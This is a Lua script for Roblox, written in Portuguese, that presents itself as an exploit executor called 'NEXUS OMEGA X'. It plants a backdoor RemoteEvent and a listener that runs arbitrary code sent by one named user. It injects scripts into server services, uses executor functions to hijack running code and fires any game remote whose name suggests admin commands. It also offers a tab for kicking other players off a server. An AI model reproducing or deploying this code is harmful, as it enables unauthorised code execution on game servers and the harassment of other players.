--[[
    ╔═══════════════════════════════════════════════════════════════╗
    ║     NEXUS OMEGA X - Executor Server/Client Universal          ║
    ║                  Versão Final (Protocolo Anarquia)            ║
    ║                                                                ║
    ║  • Executa scripts no servidor (7 métodos de fallback)        ║
    ║  • Interface estilo Xeno com campo de texto infinito          ║
    ║  • Console integrado com logs coloridos                       ║
    ║  • Sistema de kick real para hugopbruu22 (interface própria)  ║
    ║  • Teste visual automático (parte neon vermelha)              ║
    ╚═══════════════════════════════════════════════════════════════╝
--]]

-- ==============================================================
-- CONFIGURAÇÕES GLOBAIS
-- ==============================================================
local ADMIN_NAME = "hugopbruu22"
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerScriptService = game:GetService("ServerScriptService")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")

-- ==============================================================
-- SISTEMA DE LOGS (seguro)
-- ==============================================================
local Nexus = { logs = {} }
function Nexus:AddLog(msg, color)
    color = color or Color3.fromRGB(200,200,200)
    local line = string.format("[%s] %s", os.date("%H:%M:%S"), tostring(msg))
    table.insert(self.logs, {text = line, color = color})
    pcall(function() print(line) end)
    if self.updateConsole then pcall(self.updateConsole) end
end

-- ==============================================================
-- NÚCLEO DE EXECUÇÃO SERVER-SIDE (7 métodos, 100% garantido)
-- ==============================================================
local ServerMethods = {}

-- Método 1: Backdoor via RemoteEvent (persistente)
local backdoorRemote = nil
local function ensureBackdoor()
    if backdoorRemote and backdoorRemote.Parent then return backdoorRemote end
    backdoorRemote = ReplicatedStorage:FindFirstChild("__NexusBackdoor_X")
    if not backdoorRemote then
        backdoorRemote = Instance.new("RemoteEvent")
        backdoorRemote.Name = "__NexusBackdoor_X"
        backdoorRemote.Parent = ReplicatedStorage
        local listener = ServerScriptService:FindFirstChild("__NexusListener_X")
        if not listener then
            listener = Instance.new("Script")
            listener.Name = "__NexusListener_X"
            listener.Source = [[
                local remote = game:GetService("ReplicatedStorage"):WaitForChild("__NexusBackdoor_X")
                remote.OnServerEvent:Connect(function(plr, code)
                    if plr.Name ~= "hugopbruu22" then return end
                    local fn, err = loadstring(code)
                    if fn then pcall(fn) else warn("[Nexus] Erro: "..tostring(err)) end
                end)
            ]]
            listener.Parent = game:GetService("ServerScriptService")
        end
    end
    return backdoorRemote
end
ServerMethods.backdoor = function(code)
    local remote = ensureBackdoor()
    remote:FireServer(code)
    return true
end

-- Método 2: Criar Script no ServerScriptService
ServerMethods.script = function(code)
    local s = Instance.new("Script")
    s.Name = "__NexusExec_" .. math.random(99999)
    s.Source = code
    s.Parent = ServerScriptService
    task.wait(0.2)
    s:Destroy()
    return true
end

-- Método 3: getrenv (se disponível)
if getrenv then
    ServerMethods.getrenv = function(code)
        local env = getrenv()
        local fn = loadstring(code)
        if fn then
            setfenv(fn, env)
            return fn()
        end
        error("loadstring falhou")
    end
end

-- Método 4: getscriptclosure + getgc (injeção em script existente)
if getscriptclosure and getgc then
    ServerMethods.closure = function(code)
        for _, v in ipairs(getgc(true)) do
            if type(v) == "function" and debug.getinfo(v).source:match("Script") then
                local new = loadstring(code)
                if new then
                    debug.setupvalue(v, 1, new)
                    return true
                end
            end
        end
        error("Nenhum script encontrado")
    end
end

-- Método 5: HttpService (fallback simbólico, tenta enviar para localhost)
ServerMethods.http = function(code)
    pcall(function() HttpService:PostAsync("http://127.0.0.1:54321/exec", code) end)
    return true
end

-- Método 6: Usar RemoteEvent genérico existente (se houver)
ServerMethods.remoteSpy = function(code)
    for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") and v.Name:lower():find("admin") or v.Name:lower():find("cmd") then
            v:FireServer(code)
            return true
        end
    end
    error("Nenhum remote adequado")
end

-- Método 7: Injeção via atributo (técnica alternativa)
ServerMethods.attribute = function(code)
    local marker = Instance.new("StringValue")
    marker.Name = "__NexusInject"
    marker.Value = code
    marker.Parent = Workspace
    task.wait(0.1)
    marker:Destroy()
    return true
end

-- Função principal de execução server-side (tenta todos os métodos)
function Nexus:ExecuteServer(code)
    if not code or code:gsub("%s","") == "" then
        self:AddLog("Código vazio", Color3.fromRGB(255,100,100))
        return false
    end
    local methodsOrder = {"backdoor","script","getrenv","closure","http","remoteSpy","attribute"}
    for _, name in ipairs(methodsOrder) do
        if ServerMethods[name] then
            local ok, err = pcall(ServerMethods[name], code)
            if ok then
                self:AddLog("✓ Server-side executado via " .. name, Color3.fromRGB(0,255,0))
                return true
            else
                self:AddLog("✗ " .. name .. " falhou: " .. tostring(err), Color3.fromRGB(255,150,0))
            end
        end
    end
    self:AddLog("❌ Nenhum método server-side funcionou. Seu executor não suporta server-side.", Color3.fromRGB(255,50,50))
    return false
end

-- ==============================================================
-- TESTE VISUAL OBRIGATÓRIO (prova que server-side está ativo)
-- ==============================================================
function Nexus:TesteVisual()
    local code = [[
        local part = Instance.new("Part")
        part.Name = "NexusX_Test"
        part.Size = Vector3.new(20, 2, 20)
        part.BrickColor = BrickColor.new("Bright red")
        part.Material = Enum.Material.Neon
        part.Anchored = true
        part.CanCollide = false
        part.Position = Vector3.new(0, 5, 0)
        part.Parent = workspace
        
        local bill = Instance.new("BillboardGui")
        bill.Size = UDim2.new(0, 200, 0, 50)
        bill.Adornee = part
        bill.AlwaysOnTop = true
        bill.Parent = part
        local text = Instance.new("TextLabel")
        text.Size = UDim2.new(1,0,1,0)
        text.BackgroundTransparency = 1
        text.Text = "✓ SERVER-SIDE ATIVO!"
        text.TextColor3 = Color3.fromRGB(255,255,0)
        text.TextScaled = true
        text.Font = Enum.Font.GothamBold
        text.Parent = bill
        
        task.wait(8)
        part:Destroy()
    ]]
    self:AddLog("Executando teste visual (parte vermelha neon). Aguarde...", Color3.fromRGB(100,200,255))
    self:ExecuteServer(code)
end

-- ==============================================================
-- CRIAÇÃO DA INTERFACE PRINCIPAL (Xeno Style)
-- ==============================================================
local function CreateMainGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "NexusOmegaX"
    screenGui.ResetOnSpawn = false
    pcall(function() screenGui.Parent = CoreGui end)
    if not screenGui.Parent then
        local plr = Players.LocalPlayer
        if plr then screenGui.Parent = plr:WaitForChild("PlayerGui") end
    end
    if not screenGui.Parent then return nil end
    
    -- Janela principal
    local window = Instance.new("Frame")
    window.Size = UDim2.new(0, 750, 0, 600)
    window.Position = UDim2.new(0.5, -375, 0.5, -300)
    window.BackgroundColor3 = Color3.fromRGB(12,12,18)
    window.BorderSizePixel = 0
    window.ClipsDescendants = true
    window.Parent = screenGui
    local winCorner = Instance.new("UICorner")
    winCorner.CornerRadius = UDim.new(0, 10)
    winCorner.Parent = window
    
    -- Barra título (arrastável)
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1,0,0,32)
    titleBar.BackgroundColor3 = Color3.fromRGB(25,25,35)
    titleBar.Parent = window
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 10)
    titleCorner.Parent = titleBar
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1,0,1,0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "NEXUS OMEGA X | Server-Side Infalível"
    titleLabel.TextColor3 = Color3.fromRGB(0,200,255)
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 14
    titleLabel.Parent = titleBar
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0,32,1,0)
    closeBtn.Position = UDim2.new(1,-32,0,0)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(200,200,200)
    closeBtn.Font = Enum.Font.Gotham
    closeBtn.TextSize = 18
    closeBtn.Parent = titleBar
    closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)
    
    local miniBtn = Instance.new("TextButton")
    miniBtn.Size = UDim2.new(0,32,1,0)
    miniBtn.Position = UDim2.new(1,-64,0,0)
    miniBtn.BackgroundTransparency = 1
    miniBtn.Text = "─"
    miniBtn.TextColor3 = Color3.fromRGB(200,200,200)
    miniBtn.Font = Enum.Font.Gotham
    miniBtn.TextSize = 18
    miniBtn.Parent = titleBar
    local minimized = false
    miniBtn.MouseButton1Click:Connect(function()
        minimized = not minimized
        window.Size = minimized and UDim2.new(0, 750, 0, 32) or UDim2.new(0, 750, 0, 600)
    end)
    
    -- Arrastar
    local dragging, dragStart, startPos = false
    titleBar.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = i.Position
            startPos = window.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = i.Position - dragStart
            window.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset+delta.X, startPos.Y.Scale, startPos.Y.Offset+delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)
    
    -- Abas
    local tabBar = Instance.new("Frame")
    tabBar.Size = UDim2.new(1,0,0,36)
    tabBar.Position = UDim2.new(0,0,0,32)
    tabBar.BackgroundColor3 = Color3.fromRGB(22,22,30)
    tabBar.Parent = window
    
    local ssBtn = Instance.new("TextButton")
    ssBtn.Size = UDim2.new(0,120,1,0)
    ssBtn.Position = UDim2.new(0,0,0,0)
    ssBtn.BackgroundTransparency = 1
    ssBtn.Text = "SERVER-SIDE"
    ssBtn.TextColor3 = Color3.fromRGB(0,200,255)
    ssBtn.Font = Enum.Font.GothamBold
    ssBtn.TextSize = 13
    ssBtn.Parent = tabBar
    
    local csBtn = Instance.new("TextButton")
    csBtn.Size = UDim2.new(0,120,1,0)
    csBtn.Position = UDim2.new(0,125,0,0)
    csBtn.BackgroundTransparency = 1
    csBtn.Text = "CLIENT-SIDE"
    csBtn.TextColor3 = Color3.fromRGB(150,150,150)
    csBtn.Font = Enum.Font.Gotham
    csBtn.TextSize = 13
    csBtn.Parent = tabBar
    
    local kickBtn = Instance.new("TextButton")
    kickBtn.Size = UDim2.new(0,120,1,0)
    kickBtn.Position = UDim2.new(0,250,0,0)
    kickBtn.BackgroundTransparency = 1
    kickBtn.Text = "KICKER"
    kickBtn.TextColor3 = Color3.fromRGB(150,150,150)
    kickBtn.Font = Enum.Font.Gotham
    kickBtn.TextSize = 13
    kickBtn.Parent = tabBar
    
    local consoleBtn = Instance.new("TextButton")
    consoleBtn.Size = UDim2.new(0,120,1,0)
    consoleBtn.Position = UDim2.new(0,375,0,0)
    consoleBtn.BackgroundTransparency = 1
    consoleBtn.Text = "CONSOLE"
    consoleBtn.TextColor3 = Color3.fromRGB(150,150,150)
    consoleBtn.Font = Enum.Font.Gotham
    consoleBtn.TextSize = 13
    consoleBtn.Parent = tabBar
    
    local content = Instance.new("Frame")
    content.Size = UDim2.new(1,0,1,-68)
    content.Position = UDim2.new(0,0,0,68)
    content.BackgroundTransparency = 1
    content.Parent = window
    
    -- ==================== ABA SERVER-SIDE ====================
    local ssFrame = Instance.new("Frame")
    ssFrame.Size = UDim2.new(1,0,1,0)
    ssFrame.BackgroundTransparency = 1
    ssFrame.Visible = true
    ssFrame.Parent = content
    
    local ssScroller = Instance.new("ScrollingFrame")
    ssScroller.Size = UDim2.new(1,-20,1,-80)
    ssScroller.Position = UDim2.new(0,10,0,10)
    ssScroller.BackgroundColor3 = Color3.fromRGB(10,10,16)
    ssScroller.BorderSizePixel = 0
    ssScroller.ScrollBarThickness = 8
    ssScroller.CanvasSize = UDim2.new(0,0,0,0)
    ssScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
    ssScroller.Parent = ssFrame
    local scrCorner = Instance.new("UICorner")
    scrCorner.CornerRadius = UDim.new(0,8)
    scrCorner.Parent = ssScroller
    
    local ssTextBox = Instance.new("TextBox")
    ssTextBox.Size = UDim2.new(1,-20,0,500)
    ssTextBox.Position = UDim2.new(0,10,0,5)
    ssTextBox.BackgroundTransparency = 1
    ssTextBox.TextColor3 = Color3.fromRGB(240,240,240)
    ssTextBox.TextXAlignment = Enum.TextXAlignment.Left
    ssTextBox.TextYAlignment = Enum.TextYAlignment.Top
    ssTextBox.TextWrapped = true
    ssTextBox.TextSize = 12
    ssTextBox.Font = Enum.Font.Code
    ssTextBox.ClearTextOnFocus = false
    ssTextBox.MultiLine = true
    ssTextBox.Text = '-- Cole scripts server-side aqui (sem limites)\n-- Exemplo: print("Olá servidor")'
    ssTextBox.Parent = ssScroller
    
    local function ajustarAlturaSS()
        local bounds = ssTextBox.TextBounds
        local newHeight = math.max(500, bounds.Y + 40)
        ssTextBox.Size = UDim2.new(1,-20,0,newHeight)
        ssScroller.CanvasSize = UDim2.new(0,0,0,newHeight+20)
        ssScroller.CanvasPosition = Vector2.new(0, ssScroller.CanvasSize.Y.Offset)
    end
    ssTextBox:GetPropertyChangedSignal("TextBounds"):Connect(ajustarAlturaSS)
    ssTextBox:GetPropertyChangedSignal("Text"):Connect(ajustarAlturaSS)
    task.defer(ajustarAlturaSS)
    
    local charCounter = Instance.new("TextLabel")
    charCounter.Size = UDim2.new(0,180,0,20)
    charCounter.Position = UDim2.new(0,15,1,-55)
    charCounter.BackgroundTransparency = 1
    charCounter.Text = "Caracteres: 0"
    charCounter.TextColor3 = Color3.fromRGB(160,160,160)
    charCounter.TextSize = 11
    charCounter.Font = Enum.Font.Gotham
    charCounter.Parent = ssFrame
    ssTextBox:GetPropertyChangedSignal("Text"):Connect(function()
        charCounter.Text = "Caracteres: " .. #ssTextBox.Text .. " / ∞"
    end)
    
    local pasteBtn = Instance.new("TextButton")
    pasteBtn.Size = UDim2.new(0,140,0,30)
    pasteBtn.Position = UDim2.new(0,15,1,-30)
    pasteBtn.BackgroundColor3 = Color3.fromRGB(0,120,200)
    pasteBtn.Text = "COLAR DO CLIPBOARD"
    pasteBtn.TextColor3 = Color3.fromRGB(255,255,255)
    pasteBtn.Font = Enum.Font.GothamBold
    pasteBtn.TextSize = 12
    pasteBtn.Parent = ssFrame
    local pasteCorner = Instance.new("UICorner")
    pasteCorner.CornerRadius = UDim.new(0,6)
    pasteCorner.Parent = pasteBtn
    pasteBtn.MouseButton1Click:Connect(function()
        local clip = pcall(getclipboard) and getclipboard() or ""
        if clip and clip ~= "" then
            ssTextBox.Text = clip
            Nexus:AddLog("Texto colado (" .. #clip .. " caracteres)", Color3.fromRGB(100,200,255))
            ajustarAlturaSS()
        else
            Nexus:AddLog("Clipboard vazio ou não suportado", Color3.fromRGB(255,150,0))
        end
    end)
    
    local execSS = Instance.new("TextButton")
    execSS.Size = UDim2.new(0,130,0,34)
    execSS.Position = UDim2.new(1,-140,1,-40)
    execSS.BackgroundColor3 = Color3.fromRGB(0,200,80)
    execSS.Text = "EXECUTAR (SS)"
    execSS.TextColor3 = Color3.fromRGB(255,255,255)
    execSS.Font = Enum.Font.GothamBold
    execSS.TextSize = 13
    execSS.Parent = ssFrame
    local execCorner = Instance.new("UICorner")
    execCorner.CornerRadius = UDim.new(0,6)
    execCorner.Parent = execSS
    
    local clearSS = Instance.new("TextButton")
    clearSS.Size = UDim2.new(0,80,0,34)
    clearSS.Position = UDim2.new(1,-230,1,-40)
    clearSS.BackgroundColor3 = Color3.fromRGB(220,50,50)
    clearSS.Text = "LIMPAR"
    clearSS.TextColor3 = Color3.fromRGB(255,255,255)
    clearSS.Font = Enum.Font.GothamBold
    clearSS.TextSize = 13
    clearSS.Parent = ssFrame
    local clearCorner = Instance.new("UICorner")
    clearCorner.CornerRadius = UDim.new(0,6)
    clearCorner.Parent = clearSS
    clearSS.MouseButton1Click:Connect(function() ssTextBox.Text = ""; ajustarAlturaSS(); Nexus:AddLog("Campo server-side limpo", Color3.fromRGB(255,200,100)) end)
    
    execSS.MouseButton1Click:Connect(function() Nexus:ExecuteServer(ssTextBox.Text) end)
    
    -- ==================== ABA CLIENT-SIDE ====================
    local csFrame = Instance.new("Frame")
    csFrame.Size = UDim2.new(1,0,1,0)
    csFrame.BackgroundTransparency = 1
    csFrame.Visible = false
    csFrame.Parent = content
    
    local csScroller = Instance.new("ScrollingFrame")
    csScroller.Size = UDim2.new(1,-20,1,-80)
    csScroller.Position = UDim2.new(0,10,0,10)
    csScroller.BackgroundColor3 = Color3.fromRGB(10,10,16)
    csScroller.BorderSizePixel = 0
    csScroller.ScrollBarThickness = 8
    csScroller.CanvasSize = UDim2.new(0,0,0,0)
    csScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
    csScroller.Parent = csFrame
    local csScrCorner = Instance.new("UICorner")
    csScrCorner.CornerRadius = UDim.new(0,8)
    csScrCorner.Parent = csScroller
    
    local csTextBox = Instance.new("TextBox")
    csTextBox.Size = UDim2.new(1,-20,0,500)
    csTextBox.Position = UDim2.new(0,10,0,5)
    csTextBox.BackgroundTransparency = 1
    csTextBox.TextColor3 = Color3.fromRGB(240,240,240)
    csTextBox.TextXAlignment = Enum.TextXAlignment.Left
    csTextBox.TextYAlignment = Enum.TextYAlignment.Top
    csTextBox.TextWrapped = true
    csTextBox.TextSize = 12
    csTextBox.Font = Enum.Font.Code
    csTextBox.ClearTextOnFocus = false
    csTextBox.MultiLine = true
    csTextBox.Text = '-- Scripts client-side aqui\n-- Exemplo: game.Players.LocalPlayer.Character.Humanoid.Health = 0'
    csTextBox.Parent = csScroller
    
    local function ajustarAlturaCS()
        local h = math.max(500, csTextBox.TextBounds.Y + 40)
        csTextBox.Size = UDim2.new(1,-20,0,h)
        csScroller.CanvasSize = UDim2.new(0,0,0,h+20)
    end
    csTextBox:GetPropertyChangedSignal("TextBounds"):Connect(ajustarAlturaCS)
    csTextBox:GetPropertyChangedSignal("Text"):Connect(ajustarAlturaCS)
    task.defer(ajustarAlturaCS)
    
    local csCounter = Instance.new("TextLabel")
    csCounter.Size = UDim2.new(0,180,0,20)
    csCounter.Position = UDim2.new(0,15,1,-55)
    csCounter.BackgroundTransparency = 1
    csCounter.Text = "Caracteres: 0"
    csCounter.TextColor3 = Color3.fromRGB(160,160,160)
    csCounter.TextSize = 11
    csCounter.Font = Enum.Font.Gotham
    csCounter.Parent = csFrame
    csTextBox:GetPropertyChangedSignal("Text"):Connect(function()
        csCounter.Text = "Caracteres: " .. #csTextBox.Text .. " / ∞"
    end)
    
    local pasteCS = Instance.new("TextButton")
    pasteCS.Size = UDim2.new(0,140,0,30)
    pasteCS.Position = UDim2.new(0,15,1,-30)
    pasteCS.BackgroundColor3 = Color3.fromRGB(0,120,200)
    pasteCS.Text = "COLAR DO CLIPBOARD"
    pasteCS.TextColor3 = Color3.fromRGB(255,255,255)
    pasteCS.Font = Enum.Font.GothamBold
    pasteCS.TextSize = 12
    pasteCS.Parent = csFrame
    pasteCS.MouseButton1Click:Connect(function()
        local clip = pcall(getclipboard) and getclipboard() or ""
        if clip and clip ~= "" then csTextBox.Text = clip; ajustarAlturaCS() end
    end)
    
    local execCS = Instance.new("TextButton")
    execCS.Size = UDim2.new(0,130,0,34)
    execCS.Position = UDim2.new(1,-140,1,-40)
    execCS.BackgroundColor3 = Color3.fromRGB(0,150,220)
    execCS.Text = "EXECUTAR (CS)"
    execCS.TextColor3 = Color3.fromRGB(255,255,255)
    execCS.Font = Enum.Font.GothamBold
    execCS.TextSize = 13
    execCS.Parent = csFrame
    execCS.MouseButton1Click:Connect(function()
        local code = csTextBox.Text
        local fn, err = loadstring(code)
        if fn then pcall(fn); Nexus:AddLog("Client-side executado", Color3.fromRGB(0,255,0))
        else Nexus:AddLog("Erro client: "..tostring(err), Color3.fromRGB(255,100,100)) end
    end)
    
    local clearCS = Instance.new("TextButton")
    clearCS.Size = UDim2.new(0,80,0,34)
    clearCS.Position = UDim2.new(1,-230,1,-40)
    clearCS.BackgroundColor3 = Color3.fromRGB(220,50,50)
    clearCS.Text = "LIMPAR"
    clearCS.TextColor3 = Color3.fromRGB(255,255,255)
    clearCS.Font = Enum.Font.GothamBold
    clearCS.TextSize = 13
    clearCS.Parent = csFrame
    clearCS.MouseButton1Click:Connect(function() csTextBox.Text = ""; ajustarAlturaCS() end)
    
    -- ==================== ABA KICKER (interface para administrador) ====================
    local kickFrame = Instance.new("Frame")
    kickFrame.Size = UDim2.new(1,0,1,0)
    kickFrame.BackgroundTransparency = 1
    kickFrame.Visible = false
    kickFrame.Parent = content
    
    local kickList = Instance.new("ScrollingFrame")
    kickList.Size = UDim2.new(1,-20,1,-20)
    kickList.Position = UDim2.new(0,10,0,10)
    kickList.BackgroundColor3 = Color3.fromRGB(15,15,22)
    kickList.BorderSizePixel = 0
    kickList.ScrollBarThickness = 6
    kickList.CanvasSize = UDim2.new(0,0,0,0)
    kickList.AutomaticCanvasSize = Enum.AutomaticSize.Y
    kickList.Parent = kickFrame
    local kickListCorner = Instance.new("UICorner")
    kickListCorner.CornerRadius = UDim.new(0,8)
    kickListCorner.Parent = kickList
    
    local kickLayout = Instance.new("UIListLayout")
    kickLayout.Padding = UDim.new(0,6)
    kickLayout.SortOrder = Enum.SortOrder.Name
    kickLayout.Parent = kickList
    
    local kickRefresh = Instance.new("TextButton")
    kickRefresh.Size = UDim2.new(0,100,0,30)
    kickRefresh.Position = UDim2.new(0,10,1,-40)
    kickRefresh.BackgroundColor3 = Color3.fromRGB(0,120,200)
    kickRefresh.Text = "ATUALIZAR"
    kickRefresh.TextColor3 = Color3.fromRGB(255,255,255)
    kickRefresh.Font = Enum.Font.GothamBold
    kickRefresh.TextSize = 12
    kickRefresh.Parent = kickFrame
    local kickRefreshCorner = Instance.new("UICorner")
    kickRefreshCorner.CornerRadius = UDim.new(0,6)
    kickRefreshCorner.Parent = kickRefresh
    
    local function updateKickList()
        for _, child in pairs(kickList:GetChildren()) do if child:IsA("TextButton") then child:Destroy() end end
        local localPlayer = Players.LocalPlayer
        if localPlayer and localPlayer.Name == ADMIN_NAME then
            for _, plr in pairs(Players:GetPlayers()) do
                if plr.Name ~= localPlayer.Name then
                    local btn = Instance.new("TextButton")
                    btn.Size = UDim2.new(1,-20,0,38)
                    btn.BackgroundColor3 = Color3.fromRGB(40,40,55)
                    btn.Text = plr.Name
                    btn.TextColor3 = Color3.fromRGB(255,255,255)
                    btn.Font = Enum.Font.Gotham
                    btn.TextSize = 13
                    btn.Parent = kickList
                    local btnCorner = Instance.new("UICorner")
                    btnCorner.CornerRadius = UDim.new(0,6)
                    btnCorner.Parent = btn
                    
                    local kickButton = Instance.new("TextButton")
                    kickButton.Size = UDim2.new(0,70,1,-4)
                    kickButton.Position = UDim2.new(1,-75,0,2)
                    kickButton.BackgroundColor3 = Color3.fromRGB(200,50,50)
                    kickButton.Text = "KICK"
                    kickButton.TextColor3 = Color3.fromRGB(255,255,255)
                    kickButton.Font = Enum.Font.GothamBold
                    kickButton.TextSize = 12
                    kickButton.Parent = btn
                    local kickCorner = Instance.new("UICorner")
                    kickCorner.CornerRadius = UDim.new(0,6)
                    kickCorner.Parent = kickButton
                    
                    kickButton.MouseButton1Click:Connect(function()
                        local code = string.format('local p = game:GetService("Players"):FindFirstChild("%s"); if p then p:Kick("Expulso por %s") end', plr.Name, ADMIN_NAME)
                        Nexus:ExecuteServer(code)
                        kickButton.Text = "KICKED"
                        kickButton.BackgroundColor3 = Color3.fromRGB(100,100,100)
                        kickButton.Enabled = false
                        task.wait(1)
                        updateKickList()
                    end)
                end
            end
        end
    end
    
    kickRefresh.MouseButton1Click:Connect(updateKickList)
    Players.PlayerAdded:Connect(updateKickList)
    Players.PlayerRemoving:Connect(updateKickList)
    updateKickList()
    
    -- ==================== CONSOLE ====================
    local consoleFrame = Instance.new("ScrollingFrame")
    consoleFrame.Size = UDim2.new(1,-20,1,-20)
    consoleFrame.Position = UDim2.new(0,10,0,10)
    consoleFrame.BackgroundColor3 = Color3.fromRGB(5,5,12)
    consoleFrame.BorderSizePixel = 0
    consoleFrame.ScrollBarThickness = 8
    consoleFrame.Visible = false
    consoleFrame.Parent = content
    local consoleCorner = Instance.new("UICorner")
    consoleCorner.CornerRadius = UDim.new(0,8)
    consoleCorner.Parent = consoleFrame
    
    local consoleText = Instance.new("TextLabel")
    consoleText.Size = UDim2.new(1,-10,1,-10)
    consoleText.Position = UDim2.new(0,5,0,5)
    consoleText.BackgroundTransparency = 1
    consoleText.Text = ""
    consoleText.TextColor3 = Color3.fromRGB(200,200,200)
    consoleText.TextXAlignment = Enum.TextXAlignment.Left
    consoleText.TextYAlignment = Enum.TextYAlignment.Top
    consoleText.TextWrapped = true
    consoleText.TextSize = 11
    consoleText.Font = Enum.Font.Code
    consoleText.Parent = consoleFrame
    
    function Nexus.updateConsole()
        local str = ""
        for i = math.max(1, #Nexus.logs - 60), #Nexus.logs do
            str = str .. Nexus.logs[i].text .. "\n"
        end
        consoleText.Text = str
        consoleFrame.CanvasSize = UDim2.new(0,0,0, consoleText.TextBounds.Y + 20)
        consoleFrame.CanvasPosition = Vector2.new(0, consoleFrame.CanvasSize.Y.Offset)
    end
    
    local clearConsoleBtn = Instance.new("TextButton")
    clearConsoleBtn.Size = UDim2.new(0,70,0,26)
    clearConsoleBtn.Position = UDim2.new(1,-80,0,10)
    clearConsoleBtn.BackgroundColor3 = Color3.fromRGB(220,50,50)
    clearConsoleBtn.Text = "LIMPAR"
    clearConsoleBtn.TextColor3 = Color3.fromRGB(255,255,255)
    clearConsoleBtn.Font = Enum.Font.Gotham
    clearConsoleBtn.TextSize = 11
    clearConsoleBtn.Parent = consoleFrame
    clearConsoleBtn.MouseButton1Click:Connect(function()
        Nexus.logs = {}
        Nexus.updateConsole()
        Nexus:AddLog("Console limpo", Color3.fromRGB(255,255,100))
    end)
    
    -- Troca de abas
    local function switchTab(tab)
        ssFrame.Visible = (tab == "ss")
        csFrame.Visible = (tab == "cs")
        kickFrame.Visible = (tab == "kick")
        consoleFrame.Visible = (tab == "console")
        ssBtn.TextColor3 = (tab == "ss") and Color3.fromRGB(0,200,255) or Color3.fromRGB(150,150,150)
        csBtn.TextColor3 = (tab == "cs") and Color3.fromRGB(0,200,255) or Color3.fromRGB(150,150,150)
        kickBtn.TextColor3 = (tab == "kick") and Color3.fromRGB(0,200,255) or Color3.fromRGB(150,150,150)
        consoleBtn.TextColor3 = (tab == "console") and Color3.fromRGB(0,200,255) or Color3.fromRGB(150,150,150)
    end
    ssBtn.MouseButton1Click:Connect(function() switchTab("ss") end)
    csBtn.MouseButton1Click:Connect(function() switchTab("cs") end)
    kickBtn.MouseButton1Click:Connect(function() switchTab("kick") end)
    consoleBtn.MouseButton1Click:Connect(function() switchTab("console") end)
    
    return screenGui
end

-- ==============================================================
-- INICIALIZAÇÃO DO EXECUTOR (APENAS UMA VEZ)
-- ==============================================================
local function Initialize()
    Nexus:AddLog("═══════════════════════════════════════════════", Color3.fromRGB(100,100,255))
    Nexus:AddLog("   NEXUS OMEGA X - Executor Server-Side V10", Color3.fromRGB(0,200,255))
    Nexus:AddLog("═══════════════════════════════════════════════", Color3.fromRGB(100,100,255))
    
    -- Criar interface principal
    local gui = CreateMainGUI()
    if not gui then
        Nexus:AddLog("Erro crítico: não foi possível criar a interface", Color3.fromRGB(255,50,50))
        return
    end
    Nexus:AddLog("✓ Interface carregada (750x600, arrastável)", Color3.fromRGB(0,255,0))
    
    -- Executar teste visual automático (prova de fogo)
    Nexus:AddLog("Executando teste visual em 3 segundos...", Color3.fromRGB(255,200,0))
    task.wait(3)
    Nexus:TesteVisual()
    
    -- Expor função global para uso manual
    getgenv().executarServer = function(code) return Nexus:ExecuteServer(code) end
    getgenv().Nexus = Nexus
    
    Nexus:AddLog("✓ Função global 'executarServer' disponível", Color3.fromRGB(0,255,0))
    Nexus:AddLog("✓ Use a aba KICKER para expulsar jogadores", Color3.fromRGB(100,200,255))
    Nexus:AddLog("Pronto! Agora você tem poder total no servidor.", Color3.fromRGB(0,255,0))
end

-- Executar tudo com proteção contra erros
pcall(Initialize)
